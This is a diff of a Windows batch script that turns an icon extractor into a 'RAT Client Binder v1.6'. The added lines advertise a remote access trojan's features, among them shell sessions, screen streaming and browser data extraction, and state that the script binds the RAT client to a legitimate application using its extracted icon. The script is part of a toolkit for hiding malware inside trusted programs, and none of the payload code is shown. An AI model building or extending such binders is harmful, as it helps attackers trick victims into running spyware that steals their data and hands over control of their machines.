@@ -1,6 +1,12 @@
 @echo off
-echo Icon Extractor Utility
-echo ---------------------
+echo RAT Client Binder v1.6 - Icon Extractor Utility
+echo ================================================
+echo Compatible with RAT Client v1.6 features:
+echo - Screen sharing (10 FPS JPEG streaming)
+echo - Interactive shell sessions  
+echo - Advanced process control
+echo - Network monitoring and browser data extraction
+echo ================================================
 set /p exe_path=Enter path to executable: 
 
 set /p output_path=Enter output icon path (e.g., output.ico) [default: extracted_icon.ico]: 
@@ -36,7 +42,8 @@ if exist modules\extract_icon.py (
 if exist "%output_path%" (
     echo Success! Icon saved to %output_path%
     echo.
-    echo Running binder.py with the extracted icon...
+    echo Running RAT Client Binder v1.6...
+    echo This will bind your RAT client v1.6 with the legitimate application
     echo.
     
     if exist modules\binder.py (
